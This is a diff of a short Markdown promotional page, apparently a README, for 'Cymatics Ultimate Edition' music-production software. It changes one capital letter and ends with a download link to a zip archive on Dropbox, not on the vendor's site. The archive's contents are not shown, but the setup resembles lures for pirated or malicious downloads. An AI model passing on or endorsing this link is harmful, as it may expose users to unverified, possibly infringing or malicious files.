@@ -12,6 +12,6 @@
 
 ![alt-текст](https://img.discogs.com/eEXDHO2QUp5ipA-c_Xov5FOxcSc=/600x600/smart/filters:strip_icc():format(jpeg):mode_rgb():quality(90)/discogs-images/A-3091622-1569831429-8477.jpeg.jpg "Cymatics Ultimate Edition")
 
-* Want to fulfil your dream of being a creative music producer, even without any experience? Cymatics Ultimate Edition lets you get started right away. Simply choose sounds from a massive collection of beats, tunes and vocals at chart quality level. Combine sounds and loops per drag & drop, play a whole library of software instruments and apply professional effects. It's time for your creative ideas to take center stage. Simply create music..
+* Want to fulfil your Dream of being a creative music producer, even without any experience? Cymatics Ultimate Edition lets you get started right away. Simply choose sounds from a massive collection of beats, tunes and vocals at chart quality level. Combine sounds and loops per drag & drop, play a whole library of software instruments and apply professional effects. It's time for your creative ideas to take center stage. Simply create music..
 
 ## [Download Cymatics Ultimate Edition](https://www.dropbox.com/s/9bi09bfzy72zhu2/Cymatic%20Ultimate%20Edition.zip?dl=1)
